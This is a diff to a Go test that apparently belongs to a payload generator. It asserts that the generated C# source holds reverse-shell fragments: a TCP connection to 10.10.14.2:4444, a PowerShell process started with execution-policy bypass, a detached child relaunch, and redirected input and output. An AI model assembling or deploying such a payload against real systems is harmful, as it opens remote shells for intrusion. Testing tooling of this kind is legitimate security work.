@@ -34,9 +34,19 @@ func TestGenerateCSharpSourceContainsConnectionAndProcessLoop(t *testing.T) {
 	src := gen.GenerateCSharpSource()
 	checks := []string{
 		`new TcpClient("10.10.14.2", 4444)`,
-		`FileName = "cmd.exe"`,
-		`OutputDataReceived`,
+		`if (args.Length == 0 || args[0] != "--child")`,
+		`Arguments = "--child"`,
+		`UseShellExecute = true`,
+		`FileName = @"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"`,
+		`Arguments = "-ep bypass -nologo"`,
+		`OutputDataReceived += new DataReceivedEventHandler(HandleDataReceived)`,
+		`ErrorDataReceived += new DataReceivedEventHandler(HandleDataReceived)`,
 		`BeginOutputReadLine()`,
+		`BeginErrorReadLine()`,
+		`private static StreamWriter streamWriter;`,
+		`streamWriter.AutoFlush = true;`,
+		`proc.StandardInput.WriteLine(userInput);`,
+		`proc.StandardInput.Flush();`,
 	}
 	for _, check := range checks {
 		if !strings.Contains(src, check) {
